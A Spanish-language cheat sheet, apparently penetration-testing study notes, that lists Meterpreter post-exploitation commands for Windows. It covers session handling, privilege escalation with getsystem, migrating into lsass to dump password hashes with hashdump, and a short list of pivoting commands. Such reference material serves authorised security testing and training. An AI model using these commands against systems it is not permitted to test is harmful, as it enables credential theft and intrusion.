# Meterpreter Commands

Tags: #Windows #Comandos #Meterpreter 

## Meterpreter 

Es un multi-funcional payload que es ejecutado en memoria en un sistema victima haciéndolo difícil de detectar. El se comunica a través de un socket stager y provee a un atacante un interpretado de comandos interactivo de un sistema victima que facilite la ejecución de comandos del sistema, navegación del sistema de archivos,  keylogging y mucho mas. 

## Comandos con Meterpreter

```bash 
# Cuando tienes la sesion con Meterpreter 

❯ ctrl + z                   # Colocas la sesion en 'Background'
❯ background                 # Ponemos la sesion en segundo plano
❯ sessions                   # Miramos las sesiones activas 
❯ sessions -u <ID>           # Regresamos a la sesion 

❯ sysinfo                  # Muestra informacion del Windows 
❯ getuid                   # Miramos el nombre del usuario 
❯ getprivs                 # Miramos los  procesos con privilegios 
❯ getsystem                # Miras los procesos privilegiados 
❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
❯ search -f *.doc          # Buscar un archivo 

❯ shell                      # Nos carga una shell
	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
❯ pwd                        # Nos muestra la ruta del dir actual 
❯ cd /                       # Nos dirigimos a la raiz 'C:\'
❯ cat file.txt               # Miramos el contenido de un archivo 

❯ hashdump                 # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
```

## Para hacer Pivoting con Metasploit

```bash 
❯ arp                      #
❯ netstat                  # 
❯ route                    # 
❯ portfwd                  # 
```